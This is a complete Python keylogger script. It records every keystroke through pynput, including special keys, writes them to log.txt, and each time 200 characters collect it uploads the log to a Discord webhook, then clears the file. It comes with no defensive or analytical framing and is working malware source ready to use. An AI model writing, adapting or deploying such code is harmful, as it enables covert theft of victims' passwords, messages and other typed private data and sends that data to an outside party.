import pynput.keyboard
import requests
import os

# Discord webhook URL
WEBHOOK_URL = 'your webhook url'

logger = [] 

# Create txt file and send to discord bot
def append_to_log(key_stroke):
    global logger
    logger.append(key_stroke)  
    with open("log.txt", "a+", encoding="utf-8") as file:
        file.write(key_stroke) # +"\n" next to key_stroke to have every key to a new line
    
    # Every 200 characters will be sent to discord
    if len("".join(logger)) >= 200:  
        send_to_discord()
        logger = []  

# Get the keystrokes
def evaluate_keys(key):
    try:
        pressed_k = key.char if key.char else "" 
    except AttributeError:
        #special key
        pressed_k = " " if key == pynput.keyboard.Key.space else f" [{key}] "

    append_to_log(pressed_k)

# Send the txt file to bot once it reaches 200 characters
def send_to_discord():
    if os.path.exists('log.txt'):
        with open('log.txt', "rb") as file:
            response = requests.post(WEBHOOK_URL, files={"file": file})  # Send the file to Discord
        if response.status_code == 200:
            open("log.txt", "w").close()  # Clear log after sending

# Start the keylogger
def start():
    with pynput.keyboard.Listener(on_press=evaluate_keys) as listener:
        listener.join() 

start()  
